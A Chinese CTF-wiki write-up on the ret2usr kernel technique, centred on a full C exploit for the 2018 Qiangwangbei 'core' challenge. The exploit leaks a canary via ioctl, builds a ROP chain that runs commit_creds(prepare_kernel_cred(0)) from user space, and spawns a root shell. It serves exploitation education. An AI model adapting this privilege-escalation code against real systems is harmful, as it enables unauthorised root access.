[EN](./ret2usr.md) | [ZH](./ret2usr-zh.md)
## ret2usr
ret2usr 攻击利用了 **用户空间的进程不能访问内核空间，但内核空间能访问用户空间** 这个特性来定向内核代码或数据流指向用户控件，以 `ring 0` 特权执行用户空间代码完成提权等操作。

### 2018 强网杯 - core
上一篇分析了使用 [kernel rop](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_rop/#kernel-rop-2018-core) 完成提权拿 shell 的步骤，这一篇分析一下使用 ret2usr 手法获取 root shell。

题目就不再分析了，直接分析 exp。

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
			);
	puts("[*]status has been saved.");
}


void get_shell(void){
    system("/bin/sh");
}

size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t raw_vmlinux_base = 0xffffffff81000000;
size_t vmlinux_base = 0;
size_t find_symbols()
{
	FILE* kallsyms_fd = fopen("/tmp/kallsyms", "r");
	/* FILE* kallsyms_fd = fopen("./test_kallsyms", "r"); */

	if(kallsyms_fd < 0)
	{
		puts("[*]open kallsyms error!");
		exit(0);
	}

	char buf[0x30] = {0};
	while(fgets(buf, 0x30, kallsyms_fd))
	{
		if(commit_creds & prepare_kernel_cred)
			return 0;

		if(strstr(buf, "commit_creds") && !commit_creds)
		{
			/* puts(buf); */
			char hex[20] = {0};
			strncpy(hex, buf, 16);
			/* printf("hex: %s\n", hex); */
			sscanf(hex, "%llx", &commit_creds);
			printf("commit_creds addr: %p\n", commit_creds);
			vmlinux_base = commit_creds - 0x9c8e0;
			printf("vmlinux_base addr: %p\n", vmlinux_base);
		}

		if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
		{
			/* puts(buf); */
			char hex[20] = {0};
			strncpy(hex, buf, 16);
			sscanf(hex, "%llx", &prepare_kernel_cred);
			printf("prepare_kernel_cred addr: %p\n", prepare_kernel_cred);
			vmlinux_base = prepare_kernel_cred - 0x9cce0;
			/* printf("vmlinux_base addr: %p\n", vmlinux_base); */
		}
	}

	if(!(prepare_kernel_cred & commit_creds))
	{
		puts("[*]Error!");
		exit(0);
	}

}


void get_root()
{
	char* (*pkc)(int) = prepare_kernel_cred;
	void (*cc)(char*) = commit_creds;
	(*cc)((*pkc)(0));
	/* puts("[*] root now."); */
}

void set_off(int fd, long long idx)
{
	printf("[*]set off to %ld\n", idx);
	ioctl(fd, 0x6677889C, idx);
}

void core_read(int fd, char *buf)
{
	puts("[*]read to buf.");
	ioctl(fd, 0x6677889B, buf);

}

void core_copy_func(int fd, long long size)
{
	printf("[*]copy from user with size: %ld\n", size);
	ioctl(fd, 0x6677889A, size);
}


int main(void)
{
	find_symbols();
	size_t offset = vmlinux_base - raw_vmlinux_base;
	save_status();

	int fd = open("/proc/core",O_RDWR);
	set_off(fd, 0x40);
	size_t buf[0x40/8];
	core_read(fd, buf);
	size_t canary = buf[0];
	printf("[*]canary : %p\n", canary);

	size_t rop[0x30] = {0};
	rop[8] = canary ; 
	rop[10] = (size_t)get_root;
	rop[11] = 0xffffffff81a012da + offset; // swapgs; popfq; ret
	rop[12] = 0;
	rop[13] = 0xffffffff81050ac2 + offset; // iretq; ret;
	rop[14] = (size_t)get_shell; 
	rop[15] = user_cs;
	rop[16] = user_rflags;
	rop[17] = user_sp;
	rop[18] = user_ss;

	puts("[*] DEBUG: ");
	getchar();
	write(fd, rop, 0x30 * 8);
	core_copy_func(fd, 0xffffffffffff0000 | (0x100));
}
```
比较一下和 [kernel rop](https://github.com/bash-c/pwn_repo/blob/master/QWB2018_core/rop.c) 做法的异同。

1. 通过读取 `/tmp/kallsyms` 获取 `commit_creds` 和 `prepare_kernel_cred` 的方法相同，同时根据这些偏移能确定 gadget 的地址。
2. leak canary 的方法也相同，通过控制全局变量 `off` 读出 canary。
3. 与 kernel rop 做法不同的是 rop 链的构造
	1. kernel rop 通过 内核空间的 rop 链达到执行 `commit_creds(prepare_kernel_cred(0))` 以提权目的，之后通过 `swapgs; iretq` 等返回到用户态，执行用户空间的 `system("/bin/sh")` 获取 shell
	2. ret2usr 做法中，直接返回到用户空间构造的 `commit_creds(prepare_kernel_cred(0))` （通过函数指针实现）来提权，虽然这两个函数位于内核空间，但此时我们是 `ring 0` 特权，因此可以正常运行。之后也是通过 `swapgs; iretq` 返回到用户态来执行用户空间的 `system("/bin/sh")`

从这两种做法的比较可以体会出之所以要 `ret2usr`，是因为一般情况下在用户空间构造特定目的的代码要比在内核空间简单得多。


